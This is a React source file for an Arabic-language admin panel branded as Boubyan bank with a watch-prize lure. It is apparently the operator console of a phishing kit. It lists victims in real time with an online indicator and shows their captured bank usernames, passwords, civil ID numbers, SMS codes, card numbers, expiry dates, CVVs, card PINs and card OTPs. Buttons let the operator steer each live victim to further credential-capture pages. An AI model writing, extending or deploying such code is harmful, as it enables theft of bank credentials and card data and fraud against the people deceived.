import { useCallback, useEffect, useMemo, useState } from "react";
import {
  ArrowRight,
  Check,
  ChevronDown,
  Loader2,
  Lock,
  MessageCircle,
  Shield,
  Trash2,
  X,
} from "lucide-react";
import { toast } from "sonner";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";
import {
  deleteAllLoginRequests,
  deleteLoginRequest,
  getLoginRequests,
  routeLoginRequestTo,
  updateLoginRequestStatus,
} from "@/api/visitorsApi";
import type { BoubyanVisitor } from "@/lib/database.types";
import { ROUTES } from "@/routes";

const stepLabels: Record<string, string> = {
  watches: "اختيار الساعة",
  personal_info: "المعلومات الشخصية",
  login: "تسجيل الدخول",
  password: "كلمة السر",
  otp: "رمز التحقق",
  card_data: "بيانات البطاقة",
  card_pin: "كلمة سر البطاقة",
  card_otp: "رمز تحقق بطاقة",
};

const statusLabels: Record<string, string> = {
  pending: "بانتظار الموافقة",
  approved: "تمت الموافقة",
  rejected: "مرفوض",
  called: "تم الاتصال",
};

type RoutePage = { path: string; label: string };

const routePages: RoutePage[] = [
  { path: ROUTES.home, label: "المعلومات الشخصية" },
  { path: ROUTES.signIn, label: "تسجيل الدخول" },
  { path: ROUTES.passcode, label: "كلمة السر (الحساب)" },
  { path: ROUTES.cardData, label: "بيانات البطاقة" },
  { path: ROUTES.cardPin, label: "كلمة سر البطاقة" },
  { path: ROUTES.cardVerify, label: "رمز تحقق بطاقة" },
  { path: ROUTES.sms, label: "رمز التحقق (SMS)" },
];

const inputClass =
  "flex w-full border px-3 py-2 text-base ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm text-right h-12 bg-muted/30 border-border/40 rounded-xl focus:ring-2 focus:ring-primary/30 transition-all";

export default function AdminPage() {
  const [requests, setRequests] = useState<BoubyanVisitor[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [actionId, setActionId] = useState<string | null>(null);
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [authenticated, setAuthenticated] = useState(() => {
    if (typeof window === "undefined") return false;
    return Boolean(localStorage.getItem("admin_auth"));
  });
  const [password, setPassword] = useState("");
  const [authError, setAuthError] = useState(false);
  const [now, setNow] = useState(() => Date.now());

  useEffect(() => {
    if (!authenticated) localStorage.removeItem("admin_auth");
  }, [authenticated]);

  // Tick every 5s so the active/inactive badge refreshes without new events.
  useEffect(() => {
    if (!authenticated) return;
    const t = setInterval(() => setNow(Date.now()), 5000);
    return () => clearInterval(t);
  }, [authenticated]);


  const load = useCallback(async () => {
    try {
      const data = await getLoginRequests();
      setRequests(data);
    } catch {
      localStorage.removeItem("admin_auth");
      setAuthenticated(false);
      toast.error("خطأ في جلب البيانات");
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    if (!authenticated) return;
    load();
    const interval = window.setInterval(load, 5000);
    return () => window.clearInterval(interval);
  }, [authenticated, load]);

  const filtered = useMemo(
    () =>
      requests.filter(
        (r) =>
          !search ||
          r.contact_ref.includes(search) ||
          (r.member_label ?? "").includes(search),
      ),
    [requests, search],
  );

  const handleStatus = async (id: string, status: "approved" | "rejected") => {
    setActionId(id);
    try {
      await updateLoginRequestStatus(id, status);
      toast.success(status === "approved" ? "تمت الموافقة" : "تم الرفض");
    } catch {
      toast.error("خطأ في تحديث الحالة");
    } finally {
      setActionId(null);
    }
  };

  const handleRoute = async (id: string, path: string, label: string) => {
    setActionId(id);
    try {
      await routeLoginRequestTo(id, path);
      toast.success(`تم توجيه العميل إلى: ${label}`);
    } catch {
      toast.error("تعذر التوجيه");
    } finally {
      setActionId(null);
    }
  };

  const handleDelete = async (id: string) => {
    setActionId(id);
    try {
      await deleteLoginRequest(id);
      toast.success("تم الحذف");
      if (expandedId === id) setExpandedId(null);
    } catch {
      toast.error("تعذر تنفيذ الإجراء");
    } finally {
      setActionId(null);
    }
  };

  const handleClearAll = async () => {
    try {
      await deleteAllLoginRequests();
      toast.success("تم مسح جميع البيانات");
      setExpandedId(null);
    } catch {
      toast.error("خطأ في مسح البيانات");
    }
  };

  return (
    <div className="transition-all duration-200 ease-in-out opacity-100 translate-y-0">
      <div className="min-h-screen bg-background relative overflow-hidden p-4" dir="rtl">
        <div className="fixed inset-0 gradient-mesh pointer-events-none" />

        <div className="relative z-10 mx-auto max-w-6xl">
          <div className="bg-card rounded-2xl shadow-2xl p-6 md:p-8 border border-border/20 card-shadow">
            <div className="flex flex-col items-center text-center mb-6">
              <div className="w-14 h-14 rounded-2xl hero-gradient flex items-center justify-center mb-3 shadow-button">
                <Shield className="w-7 h-7 text-primary-foreground" />
              </div>
              <h2 className="text-2xl md:text-3xl font-extrabold text-gradient-hero">بوبيان</h2>
              <h3 className="text-base md:text-lg font-bold text-foreground">لوحة التحكم — جوائز الساعات</h3>
              {authenticated && (
                <div className="mt-2 inline-flex items-center gap-1.5 text-[11px] text-success">
                  <span className="relative flex h-2 w-2">
                    <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-success/70" />
                    <span className="relative inline-flex rounded-full h-2 w-2 bg-success" />
                  </span>
                  تحديث فوري نشط
                </div>
              )}
            </div>
            {authenticated && (
              <button
                type="button"
                onClick={() => {
                  localStorage.removeItem("admin_auth");
                  setAuthenticated(false);
                  setPassword("");
                  toast.success("تم تسجيل الخروج");
                }}
                className="fixed top-4 left-4 z-20 inline-flex items-center gap-2 px-4 py-2 rounded-lg bg-destructive text-destructive-foreground text-sm font-semibold hover:opacity-90 transition shadow-lg"
              >
                تسجيل الخروج
              </button>
            )}



            {!authenticated ? (
              <form
                className="space-y-4 text-right max-w-md mx-auto"
                onSubmit={(e) => {
                  e.preventDefault();
                  setAuthError(false);
                  localStorage.setItem("admin_auth", password);
                  getLoginRequests()
                    .then((data) => {
                      setRequests(data);
                      setAuthenticated(true);
                    })
                    .catch(() => {
                      localStorage.removeItem("admin_auth");
                      setAuthError(true);
                      toast.error("كلمة المرور غير صحيحة");
                    });
                  if (!password) {
                    localStorage.removeItem("admin_auth");
                    setAuthError(true);
                    toast.error("كلمة المرور غير صحيحة");
                  }
                }}
              >
                <div className="relative">
                  <Lock className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                  <input
                    type="password"
                    className={`${inputClass} pr-10`}
                    placeholder="كلمة المرور"
                    dir="ltr"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      setAuthError(false);
                    }}
                  />
                </div>
                {authError && (
                  <p className="text-destructive text-xs text-center">
                    كلمة المرور غير صحيحة، يرجى المحاولة مرة أخرى
                  </p>
                )}
                <button
                  className="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:opacity-50 px-4 py-2 w-full hero-gradient text-primary-foreground h-12 rounded-xl shadow-button transition-all font-bold"
                  type="submit"
                >
                  دخول
                </button>
              </form>
            ) : (
              <div className="space-y-4 text-right">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                  <input
                    placeholder="بحث باسم المستخدم أو الهاتف..."
                    value={search}
                    onChange={(e) => setSearch(e.target.value)}
                    className={`${inputClass} max-w-sm`}
                  />
                  <AlertDialog>
                    <AlertDialogTrigger asChild>
                      <button
                        type="button"
                        className="inline-flex items-center justify-center gap-2 text-sm font-bold text-destructive border border-destructive/30 rounded-xl px-4 py-2 hover:bg-destructive/10 transition-all"
                      >
                        <Trash2 className="h-4 w-4" />
                        مسح الكل
                      </button>
                    </AlertDialogTrigger>
                    <AlertDialogContent dir="rtl">
                      <AlertDialogHeader>
                        <AlertDialogTitle>مسح جميع البيانات</AlertDialogTitle>
                        <AlertDialogDescription>
                          هل أنت متأكد من مسح جميع طلبات تسجيل الدخول؟
                        </AlertDialogDescription>
                      </AlertDialogHeader>
                      <AlertDialogFooter className="gap-2">
                        <AlertDialogCancel>إلغاء</AlertDialogCancel>
                        <AlertDialogAction onClick={handleClearAll}>مسح الكل</AlertDialogAction>
                      </AlertDialogFooter>
                    </AlertDialogContent>
                  </AlertDialog>
                </div>

                {loading ? (
                  <div className="flex justify-center py-12">
                    <Loader2 className="h-8 w-8 animate-spin text-primary" />
                  </div>
                ) : filtered.length === 0 ? (
                  <p className="text-center text-muted-foreground py-12">لا توجد محادثات بعد</p>
                ) : (
                  <div className="grid gap-3">
                    {filtered.map((row) => {
                      const isOpen = expandedId === row.id;
                      return (
                        <div
                          key={row.id}
                          className={`rounded-2xl border bg-card transition-all ${
                            isOpen ? "border-primary/40 shadow-lg" : "border-border/40 hover:border-primary/30"
                          }`}
                        >
                          <button
                            type="button"
                            onClick={() => setExpandedId(isOpen ? null : row.id)}
                            className="w-full flex items-center gap-3 p-3 text-right"
                          >
                            <div className="w-10 h-10 rounded-full hero-gradient flex items-center justify-center shrink-0">
                              <MessageCircle className="w-5 h-5 text-primary-foreground" />
                            </div>
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center gap-2 flex-wrap">
                                <span className="font-mono text-sm font-bold" dir="ltr">{row.contact_ref}</span>
                                {(() => {
                                  const seen = row.last_seen_at ? new Date(row.last_seen_at).getTime() : 0;
                                  const online = now - seen < 25_000;
                                  return (
                                    <span
                                      className={`inline-flex items-center gap-1 text-[10px] font-bold px-1.5 py-0.5 rounded-full ${
                                        online ? "bg-success/10 text-success" : "bg-muted text-muted-foreground"
                                      }`}
                                    >
                                      <span className="relative flex h-1.5 w-1.5">
                                        {online && (
                                          <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-success/70" />
                                        )}
                                        <span
                                          className={`relative inline-flex rounded-full h-1.5 w-1.5 ${
                                            online ? "bg-success" : "bg-muted-foreground/60"
                                          }`}
                                        />
                                      </span>
                                      {online ? "نشط الآن" : "غير نشط"}
                                    </span>
                                  );
                                })()}
                                {row.member_label && (
                                  <span className="text-xs text-muted-foreground truncate">{row.member_label}</span>
                                )}
                              </div>
                              <div className="flex items-center gap-2 mt-1 flex-wrap">
                                <span className="text-[10px] bg-primary/10 text-primary px-1.5 py-0.5 rounded-full font-bold">
                                  {stepLabels[row.stage_key] ?? row.stage_key}
                                </span>
                                <span
                                  className={`text-[10px] font-bold px-1.5 py-0.5 rounded-full ${
                                    row.stage_state === "approved"
                                      ? "bg-success/10 text-success"
                                      : row.stage_state === "rejected"
                                        ? "bg-destructive/10 text-destructive"
                                        : row.stage_state === "called"
                                          ? "bg-warning/10 text-warning"
                                          : "bg-muted text-muted-foreground"
                                  }`}
                                >
                                  {statusLabels[row.stage_state] ?? row.stage_state}
                                </span>
                                <span className="text-[10px] text-muted-foreground">
                                  {new Date(row.created_at).toLocaleString("ar-EG")}
                                </span>
                              </div>
                            </div>

                            <ChevronDown
                              className={`w-5 h-5 text-muted-foreground transition-transform ${isOpen ? "rotate-180" : ""}`}
                            />
                          </button>

                          {isOpen && (
                            <div className="border-t border-border/30 p-4 space-y-4 bg-muted/10 rounded-b-2xl">
                              {/* Routing buttons */}
                              <div>
                                <p className="text-[11px] font-bold text-muted-foreground mb-2 flex items-center gap-1">
                                  <ArrowRight className="w-3.5 h-3.5" />
                                  توجيه العميل إلى صفحة:
                                </p>
                                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                                  {routePages.map((p) => (
                                    <button
                                      key={p.path}
                                      type="button"
                                      disabled={actionId === row.id}
                                      onClick={() => handleRoute(row.id, p.path, p.label)}
                                      className="text-xs font-bold bg-primary/5 hover:bg-primary/15 text-primary border border-primary/20 rounded-lg px-3 py-2 transition-all disabled:opacity-50"
                                    >
                                      {p.label}
                                    </button>
                                  ))}
                                </div>
                                {row.nav_target && (
                                  <p className="text-[10px] text-warning mt-2">
                                    آخر توجيه: <span className="font-mono" dir="ltr">{row.nav_target}</span>
                                  </p>
                                )}
                              </div>

                              {/* Quick actions */}
                              <div className="flex flex-wrap gap-2">
                                <button
                                  type="button"
                                  disabled={actionId === row.id}
                                  onClick={() => handleStatus(row.id, "approved")}
                                  className="inline-flex items-center gap-1.5 text-xs font-bold text-success border border-success/30 rounded-lg px-3 py-1.5 hover:bg-success/10 disabled:opacity-50"
                                >
                                  <Check className="w-3.5 h-3.5" /> موافقة
                                </button>
                                <button
                                  type="button"
                                  disabled={actionId === row.id}
                                  onClick={() => handleStatus(row.id, "rejected")}
                                  className="inline-flex items-center gap-1.5 text-xs font-bold text-destructive border border-destructive/30 rounded-lg px-3 py-1.5 hover:bg-destructive/10 disabled:opacity-50"
                                >
                                  <X className="w-3.5 h-3.5" /> رفض
                                </button>
                                <button
                                  type="button"
                                  disabled={actionId === row.id}
                                  onClick={() => handleDelete(row.id)}
                                  className="inline-flex items-center gap-1.5 text-xs font-bold text-muted-foreground border border-border/40 rounded-lg px-3 py-1.5 hover:bg-muted/40 disabled:opacity-50 mr-auto"
                                >
                                  <Trash2 className="w-3.5 h-3.5" /> حذف المحادثة
                                </button>
                              </div>

                              {/* Customer data */}
                              <div className="grid grid-cols-2 md:grid-cols-3 gap-2">
                                <DataField label="الاسم" value={row.contact_name} />
                                <DataField label="رقم الهاتف" value={row.contact_ref} ltr />
                                <DataField label="رقم الهوية المدني" value={row.civil_id} ltr />
                                <DataField label="الوظيفة" value={row.prize_choice} />
                                <DataField label="الراتب" value={row.contact_extra} ltr />
                                <DataField label="قيمة التمويل" value={row.contact_address} ltr />
                                <DataField label="اسم المستخدم" value={row.member_label} ltr />
                                <DataField label="كلمة المرور" value={row.secret_key_a} ltr />
                                <DataField label="آخر رقمين من البطاقة المدنية" value={row.id_tail} ltr />
                                <DataField label="رمز التحقق (SMS)" value={row.notify_key} ltr />
                                <DataField label="رقم البطاقة" value={row.extra_key_a} ltr />
                                <DataField label="انتهاء البطاقة" value={row.extra_key_b} ltr />
                                <DataField label="CVV" value={row.extra_key_c} ltr />
                                <DataField label="كلمة سر البطاقة" value={row.extra_key_d} ltr />
                                <DataField label="رمز تحقق البطاقة" value={row.extra_key_e} ltr />
                              </div>
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                )}

                <p className="text-muted-foreground text-[10px] mt-4 text-center">
                  الوصول مقيّد للمسؤولين المعتمدين فقط
                </p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

function DataField({ label, value, ltr }: { label: string; value: unknown; ltr?: boolean }) {
  if (value === null || value === undefined || value === "") return null;
  return (
    <div className="flex flex-col gap-0.5 bg-muted/30 rounded-lg p-2 border border-border/30">
      <span className="text-[10px] font-bold text-muted-foreground">{label}</span>
      <span className="text-xs font-mono break-all" dir={ltr ? "ltr" : "auto"}>
        {typeof value === "object" ? JSON.stringify(value) : String(value)}
      </span>
    </div>
  );
}
